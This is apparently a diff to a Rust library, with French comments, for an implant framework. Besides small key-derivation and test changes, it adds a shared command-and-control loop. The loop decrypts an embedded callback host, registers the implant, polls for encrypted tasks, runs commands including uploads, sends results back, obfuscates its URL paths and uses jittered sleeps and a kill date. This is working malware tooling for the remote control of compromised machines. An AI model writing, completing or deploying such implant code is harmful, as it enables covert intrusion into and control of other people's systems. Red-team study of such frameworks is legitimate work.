@@ -78,18 +78,18 @@ pub fn build_client() -> reqwest::blocking::Client {
 // ── Encryption ────────────────────────────────────────────────────────────────
 
 /// Derive a 32-byte key from secret and salt using SHA-256
-pub fn derive_key(secret: &str, salt: &str) -> [u8; 32] {
+pub fn derive_key(secret: &[u8], salt: &str) -> [u8; 32] {
     use sha2::{Digest, Sha256};
 
     let mut hasher = Sha256::new();
-    hasher.update(secret.as_bytes());
+    hasher.update(secret);
     hasher.update(salt.as_bytes());
 
     let result = hasher.finalize();
     let mut key = [0u8; 32];
     key.copy_from_slice(&result[..32]);
     // `result` is a stack-only GenericArray (no heap); it will be overwritten
-    // when this frame is reused. Caller should wrap the returned key in
+    // when this frame is used. Caller should wrap the returned key in
     // Zeroizing<[u8; 32]> if longer-lived zeroization is required.
     key
 }
@@ -384,7 +384,7 @@ mod tests {
 
     #[test]
     fn test_encrypt_decrypt_roundtrip() {
-        let key = derive_key("test-secret", "test-salt");
+        let key = derive_key(b"test-secret", "test-salt");
         let plaintext = "hello world";
         let encrypted = encrypt_config(plaintext, &key);
         let decrypted = decrypt_config(&encrypted, &key).unwrap();
@@ -393,13 +393,13 @@ mod tests {
 
     #[test]
     fn test_decrypt_invalid_hex_returns_none() {
-        let key = derive_key("test-secret", "test-salt");
+        let key = derive_key(b"test-secret", "test-salt");
         assert!(decrypt_config("not-hex!", &key).is_none());
     }
 
     #[test]
     fn test_decrypt_too_short_returns_none() {
-        let key = derive_key("test-secret", "test-salt");
+        let key = derive_key(b"test-secret", "test-salt");
         // 10 bytes < 12 (nonce size)
         assert!(decrypt_config("aabbccdd1122334455ff", &key).is_none());
     }
@@ -449,5 +449,132 @@ mod tests {
         set_kill_date(Some(1)); // Unix epoch + 1s, definitely in the past
         assert!(should_exit());
         set_kill_date(None); // cleanup
+    }
+}
+
+/// Payload chiffré envoyé à chaque callback (défini ici pour éviter
+/// de le redéfinir dans le loop {} de chaque implant).
+#[derive(serde::Serialize)]
+pub struct CallbackPayload {
+    pub q: String,
+    pub tasking: String,
+}
+
+/// Boucle C2 principale, partagée entre tous les implants.
+///
+/// `callback`       : env!("CALLBACK") depuis le binaire implant (hex chiffré)
+/// `implant_secret` : env!("IMPLANT_SECRET") depuis le binaire implant
+/// `reg`            : RegisterRequest pré-rempli par le code plateforme
+/// `dispatch`       : fonction de dispatch des commandes, plateforme-spécifique
+pub fn run_c2_loop<F>(callback: &str, implant_secret: &str, reg: RegisterRequest, dispatch: F)
+where
+    F: Fn(&str) -> String,
+{
+    use obfstr::obfstr;
+
+    let encryption_key = derive_key(implant_secret.as_bytes(), "callback-salt");
+    let decrypted_callback =
+        decrypt_config(callback, &encryption_key).unwrap_or_else(|| callback.to_string());
+
+    let client = build_client();
+    let base = format!("https://{}", decrypted_callback);
+
+    // Stage 1 : établissement du cookie de session
+    loop {
+        if client
+            .get(format!("{}{}", base, obfstr!("/js")))
+            .send()
+            .is_ok()
+        {
+            break;
+        }
+        if should_exit() {
+            return;
+        }
+        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
+    }
+
+    // Stage 2 : enregistrement de l'implant
+    let mut x_req_id = loop {
+        if let Ok(r) = client
+            .post(format!("{}{}", base, obfstr!("/static/register")))
+            .header("X-Client-ID", implant_secret)
+            .json(&reg)
+            .send()
+        {
+            if let Ok(t) = r.json::<TaskResponse>() {
+                break t.x_request_id;
+            }
+        }
+        sleep(5);
+    };
+
+    // Stage 3 : boucle de polling
+    let mut prev_output = String::new();
+    let mut prev_task_id = String::new();
+
+    loop {
+        if should_exit() {
+            break;
+        }
+
+        let payload_json = serde_json::to_string(&CallbackPayload {
+            q: prev_output.clone(),
+            tasking: prev_task_id.clone(),
+        })
+        .unwrap_or_else(|_| "{}".to_string());
+        let encrypted_data = encrypt_config(&payload_json, &encryption_key);
+
+        let cb = CallbackRequest {
+            data: Some(&encrypted_data),
+            q: "",
+            tasking: "",
+        };
+
+        match client
+            .post(format!("{}{}", base, obfstr!("/static/get")))
+            .header("x-request-id", &x_req_id)
+            .json(&cb)
+            .send()
+            .and_then(|r| r.json::<TaskResponse>())
+        {
+            Ok(task) => {
+                x_req_id = task.x_request_id.clone();
+
+                let decrypted_task = if let Some(enc) = task.data {
+                    if let Some(json) = decrypt_config(&enc, &encryption_key) {
+                        serde_json::from_str::<TaskResponse>(&json).unwrap_or_default()
+                    } else {
+                        TaskResponse::default()
+                    }
+                } else {
+                    task
+                };
+
+                if decrypted_task.q.is_empty() {
+                    prev_output = String::new();
+                    prev_task_id = String::new();
+                } else if decrypted_task.q == "exit" {
+                    break;
+                } else {
+                    let effective_cmd = if decrypted_task.q.starts_with("upload ") {
+                        match (&decrypted_task.upload, &decrypted_task.upload_path) {
+                            (Some(content), Some(path)) => format!("upload {} {}", content, path),
+                            _ => decrypted_task.q.clone(),
+                        }
+                    } else {
+                        decrypted_task.q.clone()
+                    };
+                    prev_output = dispatch(&effective_cmd);
+                    prev_task_id = decrypted_task.tasking.clone();
+                }
+            }
+            Err(_) => {
+                prev_output = String::new();
+                prev_task_id = String::new();
+            }
+        }
+
+        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
     }
 }
